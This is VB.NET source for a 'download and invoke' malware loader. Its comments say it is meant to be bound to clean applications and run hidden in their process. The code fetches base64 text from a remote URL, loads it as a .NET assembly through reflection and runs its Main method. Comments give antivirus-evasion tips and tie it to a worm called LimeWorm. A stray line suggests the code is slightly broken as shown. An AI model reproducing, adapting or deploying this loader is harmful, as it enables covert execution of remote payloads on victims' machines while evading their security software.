Public Class XMYCLASSx

    'FUD 5/9/2018 | https://github.com/NYAN-x-CAT

    '[Simple download and invoke]

    'Attacker can use this class to bind it with clean original applications.
    'It will run in background with the same process
    'I made it as simple as I can, Everything should be clear

    Public Shared URL As String = "<URL>"

    Public Shared Sub Main()
        Try
Re:

            'Only works with LimeWorm v5 'Because AV will catch "EntryPoint.Invoke" 
			'you could do some "Reflection" errors with "Try Catch" to bypass AV
			'Or A long sleep to bypass AV
			
            Dim _assembly As Reflection.Assembly = Reflection.Assembly.Load(Convert.FromBase64String(XDW)) 'Load Bytes from pastebin
            Dim _type As Type = _assembly.GetType("Client_0._5.C_Main") 'Namespace.Class
            Dim _obj As Object = Activator.CreateInstance(_type)
            Dim _methInfo As Reflection.MethodInfo = _type.GetMethod("Main") 'Method inside Class
            _methInfo.Invoke(_obj, Nothing) 'Invoke "Main"
        Catch
            Threading.Thread.Sleep(5000) 'In case PC is not connected to the internet, sleep and run again
        End Try
    End Sub

    Public Shared Function XDW()
        Dim wc As New Net.WebClient
        Try : Return wc.DownloadString(Text.Encoding.Default.GetString(Convert.FromBase64String(URL))) : Catch : End Try
    End Function

End Class
